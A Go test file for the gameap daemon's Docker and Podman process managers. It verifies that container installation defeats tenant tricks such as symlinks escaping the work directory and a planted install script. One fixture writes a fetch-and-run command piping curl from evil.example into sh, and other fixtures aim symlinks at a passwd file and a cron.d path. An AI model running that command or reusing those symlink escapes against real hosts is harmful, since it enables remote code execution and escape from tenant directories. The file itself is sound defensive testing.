//go:build linux || darwin

package processmanager

import (
	"bytes"
	"context"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/gameap/daemon/internal/app/config"
	"github.com/gameap/daemon/internal/app/domain"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// fakeEngine answers what an installation asks of a container engine up to the
// installation container, and refuses to create that one. The moment it is
// asked to is the moment the container would have started: what the server
// directory holds under the name of the installation script by then is what
// the container would have run.
type fakeEngine struct {
	scriptPath string

	mu       sync.Mutex
	creates  int
	observed scriptObservation
}

type scriptObservation struct {
	err     error
	mode    os.FileMode
	content string
}

func (e *fakeEngine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path

	switch {
	case strings.HasSuffix(path, "/_ping"):
		w.WriteHeader(http.StatusOK)
	case r.Method == http.MethodPost && (strings.HasSuffix(path, "/images/create") || strings.HasSuffix(path, "/images/pull")):
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, "{\"status\":\"pulled\"}\n")
	case r.Method == http.MethodPost && strings.HasSuffix(path, "/containers/create"):
		e.observeScript()
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = io.WriteString(w, `{"message":"the engine of the test creates no containers"}`)
	default:
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		_, _ = io.WriteString(w, `{"message":"no such container"}`)
	}
}

func (e *fakeEngine) observeScript() {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.creates++

	info, err := os.Lstat(e.scriptPath)
	if err != nil {
		e.observed = scriptObservation{err: err}

		return
	}

	content, err := os.ReadFile(e.scriptPath)
	e.observed = scriptObservation{err: err, mode: info.Mode(), content: string(content)}
}

func (e *fakeEngine) seen() (int, scriptObservation) {
	e.mu.Lock()
	defer e.mu.Unlock()

	return e.creates, e.observed
}

type containerInstaller interface {
	Install(ctx context.Context, server *domain.Server, out io.Writer) (domain.Result, error)
}

// containerEngines build the process manager of an engine and point it at the
// engine of the test.
var containerEngines = map[string]func(t *testing.T, cfg *config.Config, engine http.Handler) containerInstaller{
	"docker": func(t *testing.T, cfg *config.Config, engine http.Handler) containerInstaller {
		t.Helper()

		server := httptest.NewServer(engine)
		t.Cleanup(server.Close)

		cfg.ProcessManager.Config = map[string]string{
			"host":        "tcp://" + server.Listener.Addr().String(),
			"api_version": "1.47",
		}

		return NewDocker(cfg, nil, nil)
	},
	"podman": func(t *testing.T, cfg *config.Config, engine http.Handler) containerInstaller {
		t.Helper()

		// The path of a unix socket is short by its nature, and the temporary
		// directory of a test is not.
		socketDir, err := os.MkdirTemp("", "gpm")
		require.NoError(t, err)
		t.Cleanup(func() { _ = os.RemoveAll(socketDir) })

		socket := filepath.Join(socketDir, "p.sock")

		listener, err := net.Listen("unix", socket)
		require.NoError(t, err)

		server := &http.Server{Handler: engine}
		go func() { _ = server.Serve(listener) }()
		t.Cleanup(func() { _ = server.Close() })

		cfg.ProcessManager.Config = map[string]string{"socket_path": "unix://" + socket}

		return NewPodman(cfg, nil, nil)
	},
}

// containerInstallStand is a work directory with the directory of one game
// server that is installed by a container, and next to the work directory a
// directory of the node no installation may touch.
type containerInstallStand struct {
	cfg       *config.Config
	server    *domain.Server
	serverDir string
	outside   string
	secret    string
	engine    *fakeEngine
}

func givenContainerInstallStand(t *testing.T) *containerInstallStand {
	t.Helper()

	base := t.TempDir()
	workPath := filepath.Join(base, "work")
	serverDir := filepath.Join(workPath, "servers", "test")
	outside := filepath.Join(base, "outside")
	secret := filepath.Join(outside, "passwd")

	require.NoError(t, os.MkdirAll(serverDir, 0o755))
	require.NoError(t, os.Mkdir(outside, 0o755))
	require.NoError(t, os.WriteFile(secret, []byte(outsideScriptContent), 0o600))

	return &containerInstallStand{
		cfg: &config.Config{WorkPath: workPath},
		server: createTestServer(map[string]string{
			keyDockerInstallationImage:  "debian:12-slim",
			keyDockerInstallationScript: installScript,
		}, nil, nil),
		serverDir: serverDir,
		outside:   outside,
		secret:    secret,
		engine:    &fakeEngine{scriptPath: filepath.Join(serverDir, installScriptName)},
	}
}

func (s *containerInstallStand) assertOutsideUntouched(t *testing.T) {
	t.Helper()

	entries, err := os.ReadDir(s.outside)
	require.NoError(t, err)
	require.Len(t, entries, 1, "nothing may be created out of the work directory")

	info, err := os.Lstat(s.secret)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode(), "the file out of the work directory keeps its type and mode")

	content, err := os.ReadFile(s.secret)
	require.NoError(t, err)
	assert.Equal(t, outsideScriptContent, string(content))
}

// The installation of a container writes its script into the server directory
// with the privileges of the daemon and mounts the directory into a container
// that runs the script. The script the container finds is the one the daemon
// wrote, whatever the tenant left under its name, and it is gone afterwards.
func TestContainerInstall_ScriptInTheServerDir(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		plant func(t *testing.T, s *containerInstallStand)
	}{
		{
			name:  "nothing_stands_under_its_name",
			plant: func(*testing.T, *containerInstallStand) {},
		},
		{
			name: "server_directory_is_not_there_yet",
			plant: func(t *testing.T, s *containerInstallStand) {
				t.Helper()

				require.NoError(t, os.RemoveAll(filepath.Join(s.cfg.WorkPath, "servers")))
			},
		},
		{
			name: "link_to_a_file_outside_stands_under_its_name",
			plant: func(t *testing.T, s *containerInstallStand) {
				t.Helper()

				require.NoError(t, os.Symlink(s.secret, filepath.Join(s.serverDir, installScriptName)))
			},
		},
		{
			name: "link_to_a_missing_file_outside_stands_under_its_name",
			plant: func(t *testing.T, s *containerInstallStand) {
				t.Helper()

				target := filepath.Join(s.outside, "cron.d-job")
				require.NoError(t, os.Symlink(target, filepath.Join(s.serverDir, installScriptName)))
			},
		},
		{
			name: "script_of_the_tenant_stands_under_its_name",
			plant: func(t *testing.T, s *containerInstallStand) {
				t.Helper()

				script := filepath.Join(s.serverDir, installScriptName)
				require.NoError(t, os.WriteFile(script, []byte("#!/bin/sh\ncurl evil.example | sh\n# and a long tail"), 0o600))
			},
		},
	}

	for _, tt := range tests {
		for engineName, newEngine := range containerEngines {
			t.Run(tt.name+"/"+engineName, func(t *testing.T) {
				t.Parallel()

				stand := givenContainerInstallStand(t)
				tt.plant(t, stand)
				pm := newEngine(t, stand.cfg, stand.engine)
				out := &bytes.Buffer{}

				result, err := pm.Install(context.Background(), stand.server, out)

				stand.assertOutsideUntouched(t)
				require.Error(t, err, out.String())
				assert.Contains(t, err.Error(), "failed to create installation container")
				assert.Equal(t, domain.ErrorResult, result)

				creates, observed := stand.engine.seen()
				require.Equal(t, 1, creates, "the engine is asked for the installation container once")
				require.NoError(t, observed.err)
				assert.Equal(t, os.FileMode(0o755), observed.mode, "the container finds a regular file it can run")
				assert.Equal(t, installScriptOnDisk, observed.content)

				_, err = os.Lstat(filepath.Join(stand.serverDir, installScriptName))
				require.ErrorIs(t, err, os.ErrNotExist, "the script is removed when the installation is over")

				info, err := os.Lstat(stand.serverDir)
				require.NoError(t, err)
				assert.Equal(t, os.ModeDir|0o755, info.Mode())
			})
		}
	}
}

// Where the work directory belongs to the user the game servers run as, a
// symlink can stand in place of a server directory. The installation is over
// before anything is written and before the engine is asked for a container
// with the tree the link names mounted into it.
func TestContainerInstall_ServerDirReplacedByASymlink(t *testing.T) {
	t.Parallel()

	links := map[string]func(s *containerInstallStand) string{
		"absolute_link": func(s *containerInstallStand) string { return s.outside },
		"relative_link": func(*containerInstallStand) string { return "../../outside" },
	}

	for linkName, link := range links {
		for engineName, newEngine := range containerEngines {
			t.Run(linkName+"/"+engineName, func(t *testing.T) {
				t.Parallel()

				stand := givenContainerInstallStand(t)
				require.NoError(t, os.Remove(stand.serverDir))
				require.NoError(t, os.Symlink(link(stand), stand.serverDir))
				pm := newEngine(t, stand.cfg, stand.engine)
				out := &bytes.Buffer{}

				result, err := pm.Install(context.Background(), stand.server, out)

				stand.assertOutsideUntouched(t)
				require.Error(t, err, out.String())
				assert.Contains(t, err.Error(), "failed to open server directory inside the work directory")
				assert.Contains(t, err.Error(), "path escapes from parent")
				assert.Equal(t, domain.ErrorResult, result)

				creates, _ := stand.engine.seen()
				assert.Zero(t, creates, "the engine is not asked for a container")
			})
		}
	}
}
